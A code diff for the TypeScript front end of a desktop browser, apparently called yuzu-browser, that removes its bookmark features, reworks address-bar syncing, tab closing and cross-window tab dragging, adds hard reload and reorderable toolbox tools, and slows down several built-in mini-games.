@@ -19,8 +19,9 @@ interface TabInfo {
 
 let input: HTMLInputElement;
 let tabsEl: HTMLDivElement;
-let userTyping = false;
 let tabs: TabInfo[] = [];
+/** 直前に UI が「アクティブ」とみなしていたタブ id。タブが切り替わったら入力途中でもアドレスバーを強制更新する。 */
+let lastActiveTabId: number | null = null;
 
 /** 入力を URL に解決。URL らしくなければ DuckDuckGo 検索 URL にフォールバック。 */
 function resolveQuery(raw: string): string {
@@ -47,7 +48,9 @@ async function navigate(url: string): Promise<void> {
   }
 }
 
-async function history(action: "back" | "forward" | "reload"): Promise<void> {
+async function history(
+  action: "back" | "forward" | "reload" | "hard_reload",
+): Promise<void> {
   try {
     await invoke("browser_history", { action });
   } catch (e) {
@@ -230,7 +233,10 @@ function renderTabs(): void {
     close.title = "タブを閉じる";
     close.addEventListener("click", (e) => {
       e.stopPropagation();
-      void tabClose(t.id);
+      const id = t.id;
+      setTimeout(() => {
+        void tabClose(id);
+      }, 0);
     });
     el.appendChild(close);
 
@@ -239,12 +245,11 @@ function renderTabs(): void {
     el.addEventListener("pointerdown", (e) => {
       const pe = e as PointerEvent;
       if ((pe.target as HTMLElement).closest("button")) return;
-      // 中クリックで閉じる (タブが多くて scroll container 化したとき
-      // auxclick が autoscroll に取られて発火しないことがあるため
-      // pointerdown で確実に処理する)
+      // 中クリック: pointerdown ではオートスクロール抑止のみ。
+      // 実際の tabClose は auxclick (リリース後) で行う。
       if (pe.button === 1) {
         e.preventDefault();
-        void tabClose(t.id);
+        e.stopPropagation();
         return;
       }
       if (pe.button !== 0) return;
@@ -252,9 +257,14 @@ function renderTabs(): void {
       startTabDrag(t.id, el, pe);
     });
     el.addEventListener("auxclick", (e) => {
-      // フォールバック (pointerdown で処理済みでも害はない)
-      if ((e as MouseEvent).button === 1) {
+      const me = e as MouseEvent;
+      if (me.button === 1) {
         e.preventDefault();
+        e.stopPropagation();
+        const id = t.id;
+        setTimeout(() => {
+          void tabClose(id);
+        }, 0);
       }
     });
     el.addEventListener("contextmenu", (e) => {
@@ -318,8 +328,12 @@ function startTabDrag(
       .forEach((n) => n.classList.remove("drop-before", "drop-after"));
     el.classList.remove("dragging");
     if (!dragging) {
-      // ただのクリック → タブ切替
-      void tabSwitch(tabId);
+      // ただのクリック → タブ切替。pointerup ハンドラ内で同期 invoke すると
+      // WebView2 のマウスキャプチャ解除と競合してハングするため遅延させる。
+      const id = tabId;
+      setTimeout(() => {
+        void tabSwitch(id);
+      }, 0);
       return;
     }
     // ドロップ位置でアクション決定
@@ -328,10 +342,27 @@ function startTabDrag(
     const rect = tabbar.getBoundingClientRect();
     const farOutside =
       ev.clientY < rect.top - 60 || ev.clientY > rect.bottom + 60;
-    if (farOutside && tabs.length > 1) {
-      void invoke("tab_detach", { id: tabId }).catch((err) =>
-        console.error("tab_detach failed:", err),
-      );
+    if (farOutside) {
+      // タブバーから大きく離れたドロップ。
+      // まずカーソル下に「別の yuzu-browser ウィンドウ」があるか問い合わせ、
+      // あればそのインスタンスへ URL を送って新規タブとして開かせる。
+      // なければ同プロセス内で新規ウィンドウへ切り離す（リロードなし）。
+      const tab = tabs.find((t) => t.id === tabId);
+      const url = tab?.url || "";
+      void (async () => {
+        try {
+          const pid = await invoke<number | null>("tab_drop_target_pid");
+          if (pid && url) {
+            await invoke("tab_attach", { pid, url });
+            await invoke("tab_close", { id: tabId });
+            return;
+          }
+          // 同一プロセス内の新ウィンドウへ reparent（再生継続）。
+          await invoke("tab_detach", { id: tabId });
+        } catch (err) {
+          console.error("tab_detach failed:", err);
+        }
+      })();
       return;
     }
     // 並び替え
@@ -421,8 +452,15 @@ function onViewNavigated(payload: { id: number; url: string }): void {
   if (t) t.url = payload.url;
   renderTabs();
   const active = activeTab();
-  if (active && active.id === payload.id && !userTyping) {
-    input.value = payload.url;
+  if (active && active.id === payload.id) {
+    // 「ユーザーが今アドレスバーを編集中」の判定は
+    // (UI webview にフォーカスがある) かつ (input が activeElement) のときだけ。
+    // view webview がフォーカスを持っている間は UI 側はフォーカスを失うため
+    // document.hasFocus() == false になり、確実に URL を上書きできる。
+    const editing = document.hasFocus() && document.activeElement === input;
+    if (!editing) {
+      input.value = payload.url;
+    }
   }
 }
 
@@ -430,14 +468,21 @@ function onTabsUpdated(next: TabInfo[]): void {
   tabs = next;
   renderTabs();
   const active = activeTab();
-  if (active && !userTyping) {
-    input.value = active.url;
+  // アクティブタブが切り替わったら入力途中でもアドレスバーを強制同期。
+  const activeId = active ? active.id : null;
+  if (activeId !== lastActiveTabId) {
+    if (active) input.value = active.url;
+    lastActiveTabId = activeId;
+  } else if (active) {
+    const editing = document.hasFocus() && document.activeElement === input;
+    if (!editing) {
+      input.value = active.url;
+    }
   }
   // 音量・ズーム表示を active タブに同期
   if (active) {
     void syncControlsForTab(active.id);
   }
-  void refreshBookmarkStar();
 }
 
 /** 指定タブのズームをツールバー UI に反映。 */
@@ -453,6 +498,11 @@ async function syncControlsForTab(_id: number): Promise<void> {
 let zoomDisplayEl: HTMLSpanElement | null = null;
 
 window.addEventListener("DOMContentLoaded", () => {
+  // 中クリックのオートスクロール抑止は Chromium フラグ
+  // (--disable-features=MiddleClickAutoscroll) で行うため JS 側では何もしない。
+  // mousedown を capture で preventDefault するとフォーカスや click 生成が
+  // 壊れて新規タブ生成がトリガされなくなることがあるため除去した。
+
   input = document.getElementById("address") as HTMLInputElement;
   tabsEl = document.getElementById("tabs") as HTMLDivElement;
   const form = document.getElementById("address-form") as HTMLFormElement;
@@ -463,11 +513,13 @@ window.addEventListener("DOMContentLoaded", () => {
   const reloadBtn = document.getElementById(
     "reload",
   ) as HTMLButtonElement | null;
+  const superReloadBtn = document.getElementById(
+    "super-reload",
+  ) as HTMLButtonElement | null;
   const newTabBtn = document.getElementById("new-tab") as HTMLButtonElement;
 
   form.addEventListener("submit", (e) => {
     e.preventDefault();
-    userTyping = false;
     const raw = input.value.trim();
     // "AI:質問" / "ai:質問" → AI ツールに転送して質問
     const m = raw.match(/^(?:AI|ai|Ai|aI)\s*[:：]\s*(.+)$/);
@@ -478,12 +530,6 @@ window.addEventListener("DOMContentLoaded", () => {
     }
     void navigate(resolveQuery(raw));
   });
-  input.addEventListener("input", () => {
-    userTyping = true;
-  });
-  input.addEventListener("blur", () => {
-    userTyping = false;
-  });
   input.addEventListener("focus", () => {
     input.select();
   });
@@ -491,6 +537,7 @@ window.addEventListener("DOMContentLoaded", () => {
   backBtn?.addEventListener("click", () => void history("back"));
   forwardBtn?.addEventListener("click", () => void history("forward"));
   reloadBtn?.addEventListener("click", () => void history("reload"));
+  superReloadBtn?.addEventListener("click", () => void history("hard_reload"));
   newTabBtn.addEventListener("click", () => void tabNew());
 
   // タブバーへの URL ドラッグ&ドロップ → 新しいタブで開く。
@@ -598,6 +645,17 @@ window.addEventListener("DOMContentLoaded", () => {
     } else if (e.ctrlKey && k === "l") {
       e.preventDefault();
       input.focus();
+    } else if (e.ctrlKey && e.shiftKey && k === "r") {
+      // Ctrl+Shift+R: スーパーリロード（キャッシュ無視）
+      e.preventDefault();
+      void history("hard_reload");
+    } else if (e.ctrlKey && !e.shiftKey && k === "r") {
+      // Ctrl+R: 通常リロード
+      e.preventDefault();
+      void history("reload");
+    } else if (e.key === "F5") {
+      e.preventDefault();
+      void history(e.ctrlKey || e.shiftKey ? "hard_reload" : "reload");
     } else if (e.ctrlKey && k === "d" && e.shiftKey) {
       // Ctrl+Shift+D でタブ複製
       e.preventDefault();
@@ -644,99 +702,19 @@ window.addEventListener("DOMContentLoaded", () => {
   void listen<TabInfo[]>("tabs-updated", (event) => {
     onTabsUpdated(event.payload);
   });
+  void listen<{ url: string }>("external-open-tab", (event) => {
+    // 他の yuzu-browser インスタンスからタブをドロップされた。
+    if (event.payload.url) void tabNew(event.payload.url);
+  });
   void listen<{ action: string; id: number }>("tab-menu-action", (event) => {
     handleTabMenuAction(event.payload.action, event.payload.id);
   });
 
-  // ===== ブックマーク UI =====
-  bookmarkToggleBtn = document.getElementById(
-    "bookmark-toggle",
-  ) as HTMLButtonElement | null;
-  const bookmarksOpenBtn = document.getElementById(
-    "bookmarks-open",
-  ) as HTMLButtonElement | null;
-  bookmarksPanel = document.getElementById(
-    "bookmarks-panel",
-  ) as HTMLDivElement | null;
-  bookmarksListEl = document.getElementById(
-    "bookmarks-list",
-  ) as HTMLUListElement | null;
-  bookmarksEmptyEl = document.getElementById(
-    "bookmarks-empty",
-  ) as HTMLDivElement | null;
-  bookmarksBarItemsEl = document.getElementById(
-    "bookmarks-bar-items",
-  ) as HTMLDivElement | null;
-  bookmarksBarEmptyEl = document.getElementById(
-    "bookmarks-bar-empty",
-  ) as HTMLDivElement | null;
-  bookmarksBarAddBtn = document.getElementById(
-    "bookmarks-bar-add",
-  ) as HTMLButtonElement | null;
-  const bookmarksCloseBtn = document.getElementById(
-    "bookmarks-close",
-  ) as HTMLButtonElement | null;
-
-  if (bookmarkToggleBtn) {
-    bookmarkToggleBtn.addEventListener(
-      "click",
-      () => void toggleCurrentBookmark(),
-    );
-  }
-  if (bookmarksBarAddBtn) {
-    bookmarksBarAddBtn.addEventListener(
-      "click",
-      () => void toggleCurrentBookmark(),
-    );
-  }
-  if (bookmarksOpenBtn) {
-    bookmarksOpenBtn.addEventListener(
-      "click",
-      () =>
-        void (bookmarksPanelOpen
-          ? closeBookmarksPanel()
-          : openBookmarksPanel()),
-    );
-  }
-  if (bookmarksCloseBtn) {
-    bookmarksCloseBtn.addEventListener(
-      "click",
-      () => void closeBookmarksPanel(),
-    );
-  }
-
-  void listen<Bookmark[]>("bookmarks-updated", (event) => {
-    bookmarks = event.payload;
-    renderBookmarks();
-    void refreshBookmarkStar();
-  });
-
-  // ブックマーク用ショートカット: Ctrl+D で追加/削除、Ctrl+B で一覧表示
-  window.addEventListener("keydown", (e) => {
-    const k = e.key.toLowerCase();
-    if (e.ctrlKey && !e.shiftKey && k === "d") {
-      e.preventDefault();
-      void toggleCurrentBookmark();
-    } else if (e.ctrlKey && !e.shiftKey && k === "b") {
-      e.preventDefault();
-      void (bookmarksPanelOpen ? closeBookmarksPanel() : openBookmarksPanel());
-    } else if (k === "escape" && bookmarksPanelOpen) {
-      e.preventDefault();
-      void closeBookmarksPanel();
-    }
-  });
-
-  // 初期ブックマークロード
-  void invoke<Bookmark[]>("bookmark_list")
-    .then((list) => {
-      bookmarks = list;
-      renderBookmarks();
-      void refreshBookmarkStar();
-    })
-    .catch((e) => console.error("bookmark_list failed:", e));
-
   // ツールボックス UI を初期化
   void setupToolbox();
+
+  // ダウンロード UI を初期化（ツールボックスから開くパネル）
+  void setupDownloadsUI();
 
   // 初期タブリスト取得
   void invoke<TabInfo[]>("tab_list")
@@ -745,328 +723,6 @@ window.addEventListener("DOMContentLoaded", () => {
       console.error("tab_list failed:", e);
     });
 });
-
-// ===== ブックマーク =====
-
-interface Bookmark {
-  id: number;
-  url: string;
-  title: string;
-  favicon: string;
-}
-
-let bookmarks: Bookmark[] = [];
-let bookmarkToggleBtn: HTMLButtonElement | null = null;
-let bookmarksPanel: HTMLDivElement | null = null;
-let bookmarksListEl: HTMLUListElement | null = null;
-let bookmarksEmptyEl: HTMLDivElement | null = null;
-let bookmarksBarItemsEl: HTMLDivElement | null = null;
-let bookmarksBarEmptyEl: HTMLDivElement | null = null;
-let bookmarksBarAddBtn: HTMLButtonElement | null = null;
-let bookmarksPanelOpen = false;
-
-async function toggleCurrentBookmark(): Promise<void> {
-  const a = activeTab();
-  if (!a) return;
-  const existing = bookmarks.find((b) => b.url === a.url);
-  try {
-    if (existing) {
-      await invoke("bookmark_remove", { id: existing.id });
-    } else {
-      await invoke("bookmark_add", {});
-    }
-  } catch (e) {
-    console.error("toggle bookmark failed:", e);
-  }
-}
-
-async function refreshBookmarkStar(): Promise<void> {
-  const a = activeTab();
-  const isMarked = !!a && bookmarks.some((b) => b.url === a.url);
-  if (bookmarkToggleBtn) {
-    bookmarkToggleBtn.textContent = isMarked ? "★" : "☆";
-    bookmarkToggleBtn.classList.toggle("is-bookmarked", isMarked);
-    bookmarkToggleBtn.title = isMarked
-      ? "このページのブックマークを削除 (Ctrl+D)"
-      : "このページをブックマーク (Ctrl+D)";
-  }
-  if (bookmarksBarAddBtn) {
-    bookmarksBarAddBtn.textContent = isMarked ? "★" : "☆";
-    bookmarksBarAddBtn.classList.toggle("is-bookmarked", isMarked);
-    bookmarksBarAddBtn.title = isMarked
-      ? "このページのブックマークを削除 (Ctrl+D)"
-      : "このページをブックマーク (Ctrl+D)";
-  }
-}
-
-/** ブックマーク行の favicon URL を解決。
- * 1) ブックマーク自身の favicon
- * 2) 同じ URL のタブが開いていればそのタブの最新 favicon
- * 3) {origin}/favicon.ico フォールバック
- */
-function resolveBookmarkFavicon(b: Bookmark): string {
-  if (b.favicon) return b.favicon;
-  const matched = tabs.find((t) => t.url === b.url && t.favicon);
-  if (matched) return matched.favicon;
-  return faviconFallback(b.url);
-}
-
-/** Chrome 風のブックマークバー (tabbar の下に常時表示) を描画。 */
-function renderBookmarksBar(): void {
-  if (!bookmarksBarItemsEl || !bookmarksBarEmptyEl) return;
-  bookmarksBarItemsEl.innerHTML = "";
-  if (bookmarks.length === 0) {
-    bookmarksBarEmptyEl.hidden = false;
-    return;
-  }
-  bookmarksBarEmptyEl.hidden = true;
-  for (let i = 0; i < bookmarks.length; i++) {
-    const b = bookmarks[i];
-    const el = document.createElement("div");
-    el.className = "bookmarks-bar-item";
-    el.dataset.id = String(b.id);
-    el.title = `${b.title || b.url}\n${b.url}`;
-
-    const fav = document.createElement("img");
-    fav.className = "bb-favicon";
-    fav.alt = "";
-    fav.referrerPolicy = "no-referrer";
-    fav.draggable = false;
-    setupCascadingFavicon(fav, resolveBookmarkFavicon(b), b.url);
-    el.appendChild(fav);
-
-    const title = document.createElement("span");
-    title.className = "bb-title";
-    title.textContent = b.title || urlToTitle(b.url);
-    el.appendChild(title);
-
-    // pointer event ベースのクリック/並び替え
-    el.addEventListener("pointerdown", (e) => {
-      const pe = e as PointerEvent;
-      if (pe.button !== 0) return;
-      e.preventDefault();
-      startBookmarkDrag(b.id, b.url, el, pe);
-    });
-    el.addEventListener("auxclick", (e) => {
-      if ((e as MouseEvent).button === 1) {
-        e.preventDefault();
-        void tabNew(b.url);
-      }
-    });
-    el.addEventListener("contextmenu", (e) => {
-      e.preventDefault();
-      if (confirm(`このブックマークを削除しますか?\n\n${b.title || b.url}`)) {
-        void invoke("bookmark_remove", { id: b.id }).catch((err) =>
-          console.error("bookmark_remove failed:", err),
-        );
-      }
-    });
-
-    bookmarksBarItemsEl.appendChild(el);
-  }
-}
-
-/** ブックマークバー項目の pointerdown 時に呼ばれ、閾値超えで並び替え。 */
-function startBookmarkDrag(
-  bmId: number,
-  bmUrl: string,
-  el: HTMLDivElement,
-  downEvt: PointerEvent,
-): void {
-  const startX = downEvt.clientX;
-  const startY = downEvt.clientY;
-  const ctrlAtDown = downEvt.ctrlKey || downEvt.metaKey;
-  let dragging = false;
-
-  const clearMarkers = () => {
-    document
-      .querySelectorAll(
-        ".bookmarks-bar-item.drop-before, .bookmarks-bar-item.drop-after",
-      )
-      .forEach((n) => n.classList.remove("drop-before", "drop-after"));
-  };
-
-  const setDropMarkers = (x: number) => {
-    clearMarkers();
-    const target = findBookmarkAtX(x, bmId);
-    if (!target) return;
-    const r = target.el.getBoundingClientRect();
-    const before = x < r.left + r.width / 2;
-    target.el.classList.toggle("drop-before", before);
-    target.el.classList.toggle("drop-after", !before);
-  };
-
-  const onMove = (ev: PointerEvent) => {
-    if (!dragging) {
-      if (
-        Math.abs(ev.clientX - startX) > 5 ||
-        Math.abs(ev.clientY - startY) > 5
-      ) {
-        dragging = true;
-        el.classList.add("dragging");
-      } else {
-        return;
-      }
-    }
-    setDropMarkers(ev.clientX);
-  };
-
-  const onUp = (ev: PointerEvent) => {
-    window.removeEventListener("pointermove", onMove, true);
-    window.removeEventListener("pointerup", onUp, true);
-    window.removeEventListener("pointercancel", onCancel, true);
-    clearMarkers();
-    el.classList.remove("dragging");
-    if (!dragging) {
-      // 通常クリック → 開く
-      if (ctrlAtDown) {
-        void tabNew(bmUrl);
-      } else {
-        void navigate(bmUrl);
-      }
-      return;
-    }
-    // ドロップ → 並び替え
-    const target = findBookmarkAtX(ev.clientX, bmId);
-    if (!target) return;
-    const r = target.el.getBoundingClientRect();
-    const before = ev.clientX < r.left + r.width / 2;
-    const fromIdx = bookmarks.findIndex((x) => x.id === bmId);
-    if (fromIdx < 0) return;
-    let to = before ? target.index : target.index + 1;
-    if (fromIdx < to) to -= 1;
-    if (to === fromIdx) return;
-    void invoke("bookmark_reorder", { id: bmId, toIndex: to }).catch((err) =>
-      console.error("bookmark_reorder failed:", err),
-    );
-  };
-
-  const onCancel = () => {
-    window.removeEventListener("pointermove", onMove, true);
-    window.removeEventListener("pointerup", onUp, true);
-    window.removeEventListener("pointercancel", onCancel, true);
-    clearMarkers();
-    el.classList.remove("dragging");
-  };
-
-  window.addEventListener("pointermove", onMove, true);
-  window.addEventListener("pointerup", onUp, true);
-  window.addEventListener("pointercancel", onCancel, true);
-}
-
-/** 与えられた x 座標に最も近いブックマーク項目 (自分以外) を返す。 */
-function findBookmarkAtX(
-  x: number,
-  selfId: number,
-): { el: HTMLDivElement; index: number } | null {
-  if (!bookmarksBarItemsEl) return null;
-  const els = Array.from(
-    bookmarksBarItemsEl.querySelectorAll<HTMLDivElement>(".bookmarks-bar-item"),
-  );
-  let best: { el: HTMLDivElement; index: number; dist: number } | null = null;
-  for (let i = 0; i < els.length; i++) {
-    const e = els[i];
-    if (Number(e.dataset.id) === selfId) continue;
-    const r = e.getBoundingClientRect();
-    let dist: number;
-    if (x < r.left) dist = r.left - x;
-    else if (x > r.right) dist = x - r.right;
-    else dist = 0;
-    if (best === null || dist < best.dist) {
-      best = { el: e, index: i, dist };
-    }
-  }
-  return best ? { el: best.el, index: best.index } : null;
-}
-
-function renderBookmarks(): void {
-  renderBookmarksBar();
-  if (!bookmarksListEl || !bookmarksEmptyEl) return;
-  bookmarksListEl.innerHTML = "";
-  if (bookmarks.length === 0) {
-    bookmarksEmptyEl.hidden = false;
-    return;
-  }
-  bookmarksEmptyEl.hidden = true;
-  for (const b of bookmarks) {
-    const li = document.createElement("li");
-    li.className = "bookmark-item";
-
-    const fav = document.createElement("img");
-    fav.className = "bookmark-favicon";
-    fav.alt = "";
-    fav.referrerPolicy = "no-referrer";
-    setupCascadingFavicon(fav, resolveBookmarkFavicon(b), b.url);
-    li.appendChild(fav);
-
-    const text = document.createElement("div");
-    text.className = "bookmark-text";
-    const title = document.createElement("span");
-    title.className = "bookmark-title";
-    title.textContent = b.title || b.url;
-    const url = document.createElement("span");
-    url.className = "bookmark-url";
-    url.textContent = b.url;
-    text.appendChild(title);
-    text.appendChild(url);
-    li.appendChild(text);
-
-    const rm = document.createElement("button");
-    rm.className = "bookmark-remove";
-    rm.type = "button";
-    rm.title = "削除";
-    rm.textContent = "×";
-    rm.addEventListener("click", (e) => {
-      e.stopPropagation();
-      void invoke("bookmark_remove", { id: b.id }).catch((err) =>
-        console.error("bookmark_remove failed:", err),
-      );
-    });
-    li.appendChild(rm);
-
-    li.addEventListener("click", () => {
-      void closeBookmarksPanel().then(() => tabNew(b.url));
-    });
-    li.addEventListener("auxclick", (e) => {
-      // 中クリックで現在のタブを保ったまま新規タブで開く
-      if ((e as MouseEvent).button === 1) {
-        e.preventDefault();
-        void tabNew(b.url);
-      }
-    });
-
-    bookmarksListEl.appendChild(li);
-  }
-}
-
-async function openBookmarksPanel(): Promise<void> {
-  if (!bookmarksPanel) return;
-  try {
-    await invoke("ui_set_expanded", { expanded: true });
-  } catch (e) {
-    console.error("ui_set_expanded failed:", e);
-  }
-  bookmarksPanel.hidden = false;
-  bookmarksPanelOpen = true;
-  // 最新を取得して描画
-  try {
-    bookmarks = await invoke<Bookmark[]>("bookmark_list");
-    renderBookmarks();
-  } catch (e) {
-    console.error("bookmark_list failed:", e);
-  }
-}
-
-async function closeBookmarksPanel(): Promise<void> {
-  if (!bookmarksPanel) return;
-  bookmarksPanel.hidden = true;
-  bookmarksPanelOpen = false;
-  try {
-    await invoke("ui_set_expanded", { expanded: false });
-  } catch (e) {
-    console.error("ui_set_expanded failed:", e);
-  }
-}
 
 // ===== ツールボックス =====
 
@@ -1117,6 +773,7 @@ async function openToolboxPanel(): Promise<void> {
   } catch (e) {
     console.error("ui_set_expanded failed:", e);
   }
+  toolboxPanel.style.display = "";
   toolboxPanel.hidden = false;
   toolboxOpen = true;
   await loadToolboxSettings();
@@ -1126,6 +783,7 @@ async function openToolboxPanel(): Promise<void> {
 async function closeToolboxPanel(): Promise<void> {
   if (!toolboxPanel) return;
   toolboxPanel.hidden = true;
+  toolboxPanel.style.display = "none";
   toolboxOpen = false;
   try {
     await invoke("ui_set_expanded", { expanded: false });
@@ -1210,6 +868,88 @@ async function setupToolbox(): Promise<void> {
     });
   });
 
+  // ===== ツールの並び替え (D&D) =====
+  // localStorage に並び順を保存して再起動後も維持する。
+  const TOOL_ORDER_KEY = "yuzu.toolboxNavOrder";
+  const navParent = document.getElementById("toolbox-nav");
+  const applySavedToolOrder = (): void => {
+    if (!navParent) return;
+    let saved: string[] = [];
+    try {
+      const raw = localStorage.getItem(TOOL_ORDER_KEY);
+      if (raw) saved = JSON.parse(raw);
+    } catch {
+      /* ignore */
+    }
+    if (!Array.isArray(saved) || saved.length === 0) return;
+    const map = new Map<string, HTMLElement>();
+    Array.from(navParent.children).forEach((c) => {
+      const el = c as HTMLElement;
+      const t = el.dataset?.tool;
+      if (t) map.set(t, el);
+    });
+    saved.forEach((name) => {
+      const el = map.get(name);
+      if (el) navParent.appendChild(el);
+    });
+  };
+  const saveToolOrder = (): void => {
+    if (!navParent) return;
+    const order = Array.from(navParent.children)
+      .map((c) => (c as HTMLElement).dataset?.tool)
+      .filter((s): s is string => typeof s === "string" && s.length > 0);
+    try {
+      localStorage.setItem(TOOL_ORDER_KEY, JSON.stringify(order));
+    } catch {
+      /* ignore */
+    }
+  };
+  applySavedToolOrder();
+  navItems.forEach((btn) => {
+    btn.setAttribute("draggable", "true");
+    btn.addEventListener("dragstart", (e) => {
+      const dt = (e as DragEvent).dataTransfer;
+      if (!dt) return;
+      dt.effectAllowed = "move";
+      dt.setData("text/x-yuzu-tool", btn.dataset.tool || "");
+      btn.classList.add("dragging");
+    });
+    btn.addEventListener("dragend", () => {
+      btn.classList.remove("dragging");
+      navParent
+        ?.querySelectorAll(".toolbox-nav-item.drag-over")
+        .forEach((n) => n.classList.remove("drag-over"));
+    });
+    btn.addEventListener("dragover", (e) => {
+      const dt = (e as DragEvent).dataTransfer;
+      if (!dt) return;
+      // 自分自身のツール D&D かどうかは types で判別。
+      if (!Array.from(dt.types || []).includes("text/x-yuzu-tool")) return;
+      e.preventDefault();
+      dt.dropEffect = "move";
+      btn.classList.add("drag-over");
+    });
+    btn.addEventListener("dragleave", () => {
+      btn.classList.remove("drag-over");
+    });
+    btn.addEventListener("drop", (e) => {
+      const dt = (e as DragEvent).dataTransfer;
+      if (!dt) return;
+      const src = dt.getData("text/x-yuzu-tool");
+      btn.classList.remove("drag-over");
+      if (!src || !navParent) return;
+      e.preventDefault();
+      const srcEl = navParent.querySelector(
+        `.toolbox-nav-item[data-tool="${src}"]`,
+      );
+      if (!srcEl || srcEl === btn) return;
+      const r = btn.getBoundingClientRect();
+      const dropEv = e as DragEvent;
+      const before = dropEv.clientY < r.top + r.height / 2;
+      navParent.insertBefore(srcEl, before ? btn : btn.nextSibling);
+      saveToolOrder();
+    });
+  });
   ytdlpFillBtn?.addEventListener("click", () => {
     const a = activeTab();
     if (a && ytdlpUrlInput) ytdlpUrlInput.value = a.url;
@@ -1325,11 +1065,14 @@ async function setupToolbox(): Promise<void> {
   setupTechProfileTool();
   setupOGPTool();
   setupPentestTool();
+  setupImageStudioTool();
+  setupVideoStudioTool();
   setupSpeedtestTool();
   setupCharCountTool();
   setupTodoTool();
   setupClockTool();
   setupTerminalTool();
+  setupSshTool();
 }
 
 // ===== ファイル形式コンバータ =====
@@ -3558,8 +3301,10 @@ function startDinoGame(
   let x = 60;
   let y = groundY;
   let vy = 0;
-  const gravity = 0.55;
-  let speed = 4;
+  // 重力を弱め、ジャンプを高くして滑空を長くし、タイミングを取りやすくする。
+  const gravity = 0.22;
+  const jumpVy = -10;
+  let speed = 1.6;
   let score = 0;
   let alive = true;
   interface Obs {
@@ -3578,15 +3323,15 @@ function startDinoGame(
 
   const removeKey = attachKeyHandler(canvas, (e) => {
     if ((e.key === " " || e.key === "ArrowUp") && y >= groundY && alive) {
-      vy = -13;
+      vy = jumpVy;
     }
   });
   const onClick = (): void => {
-    if (y >= groundY && alive) vy = -13;
+    if (y >= groundY && alive) vy = jumpVy;
     if (!alive) {
       alive = true;
       score = 0;
-      speed = 4;
+      speed = 1.6;
       reset();
       setScore(0);
     }
@@ -3617,12 +3362,14 @@ function startDinoGame(
         obs.shift();
         score++;
         setScore(score);
-        if (score % 10 === 0) speed += 0.4;
+        // 加速を緩やかにし、上限を設けて難易度が上がりすぎないようにする。
+        if (score % 40 === 0 && speed < 4.5) speed += 0.1;
       }
       const last = obs[obs.length - 1];
-      if (!last || last.x < W - 280 - Math.random() * 220) {
-        const h = 20 + Math.random() * 22;
-        obs.push({ x: W + 20, w: 12 + Math.random() * 10, h });
+      // 障害物の最小間隔を広げて、ジャンプのタイミングに余裕を作る。
+      if (!last || last.x < W - 720 - Math.random() * 360) {
+        const h = 10 + Math.random() * 8;
+        obs.push({ x: W + 20, w: 8 + Math.random() * 6, h });
       }
       // 衝突判定
       const px = x;
@@ -3861,6 +3608,8 @@ function start2048Game(
   };
 
   const draw = (): void => {
+    ctx.fillStyle = "#1a1a1a";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
     ctx.fillStyle = "#bbada0";
     ctx.fillRect(offX - 5, offY - 5, cell * N + 10, cell * N + 10);
     for (let r = 0; r < N; r++) {
@@ -4284,7 +4033,7 @@ function startSuikaGame(
     { r: 64, color: "#fa4", label: "🥭", pt: 36 },
     { r: 76, color: "#4c8", label: "🍉", pt: 45 },
   ];
-  const ceilingY = 40; // この高さを超えたらゲームオーバー
+  const ceilingY = 28; // この高さを超えたらゲームオーバー
   interface Ball {
     x: number;
     y: number;
@@ -4299,7 +4048,7 @@ function startSuikaGame(
   let pointerX = W / 2;
   let dropCooldown = 0;
   let over = false;
-  const gravity = 0.4;
+  const gravity = 0.18;
   const restitution = 0.18;
   const friction = 0.99;
 
@@ -4422,7 +4171,7 @@ function startSuikaGame(
         }
       }
     }
-    // ゲームオーバー判定 (天井超え + 1秒以上)
+    // ゲームオーバー判定 (天井超えが 1.5 秒以上継続)
     const now = performance.now();
     for (const b of balls) {
       const r = FRUITS[b.type].r;
@@ -5097,7 +4846,6 @@ function setupAIExtras(): void {
   setupAIMedia();
   setupAIMultiTranslate();
   setupAIAnki();
-  setupAIBookmarkTag();
 }
 
 // --- 💬 チャット ---
@@ -5711,97 +5459,6 @@ function setupAIAnki(): void {
   });
 }
 
-// --- 🔖 ブックマーク AI 分類 ---
-
-function setupAIBookmarkTag(): void {
-  const goBtn = document.getElementById("ai-bm-go") as HTMLButtonElement | null;
-  const limitEl = document.getElementById(
-    "ai-bm-limit",
-  ) as HTMLInputElement | null;
-  const fetchEl = document.getElementById(
-    "ai-bm-fetch",
-  ) as HTMLInputElement | null;
-  const statusEl = document.getElementById(
-    "ai-bm-status",
-  ) as HTMLSpanElement | null;
-  const out = document.getElementById(
-    "ai-output",
-  ) as HTMLTextAreaElement | null;
-  const status = (s: string): void => {
-    if (statusEl) statusEl.textContent = s;
-  };
-  if (!goBtn || !out) return;
-
-  goBtn.addEventListener("click", async () => {
-    const limit = Math.max(1, Math.min(200, Number(limitEl?.value) || 20));
-    const fetchBody = !!fetchEl?.checked;
-    const settings = getAISettingsOrAlert(status);
-    if (!settings) return;
-    if (bookmarks.length === 0) {
-      status("ブックマークがありません");
-      return;
-    }
-    const items = bookmarks.slice(0, limit);
-    out.value = `| # | タイトル | カテゴリ | タグ | 一言メモ |\n|---|---|---|---|---|\n`;
-    aiAbort?.abort();
-    aiAbort = new AbortController();
-    try {
-      for (let i = 0; i < items.length; i++) {
-        const b = items[i];
-        status(`分類中… (${i + 1}/${items.length})`);
-        let snippet = "";
-        if (fetchBody) {
-          try {
-            const r = await invoke<ScrapeResult>("toolbox_scrape_fetch", {
-              url: b.url,
-              userAgent: null,
-            });
-            snippet = extractMainText(r.body).text.slice(0, 2000);
-          } catch {
-            /* noop */
-          }
-        }
-        const userMsg = `URL: ${b.url}\nタイトル: ${b.title}\n${snippet ? `本文抜粋: ${snippet}` : ""}\n\n上記を分類してください。出力は JSON のみ: {"category":"...","tags":["..","..","..","..","..(最大5)"],"memo":"30 文字以内の一言"}`;
-        try {
-          const r = await callOpenAICompatible(
-            settings,
-            [
-              {
-                role: "system",
-                content:
-                  "あなたは情報整理の専門家です。出力は厳密に JSON 1 オブジェクトのみ (``` 不要)。日本語で。",
-              },
-              { role: "user", content: userMsg },
-            ],
-            aiAbort.signal,
-          );
-          const m = r.match(/\{[\s\S]*\}/);
-          if (!m) throw new Error("JSON 抽出失敗");
-          const j = JSON.parse(m[0]) as {
-            category?: string;
-            tags?: string[];
-            memo?: string;
-          };
-          const tags = (j.tags || []).join(", ");
-          const esc = (s: string): string =>
-            s.replace(/\|/g, "\\|").replace(/\n/g, " ");
-          out.value += `| ${i + 1} | [${esc(b.title || b.url)}](${b.url}) | ${esc(j.category || "?")} | ${esc(tags)} | ${esc(j.memo || "")} |\n`;
-          out.scrollTop = out.scrollHeight;
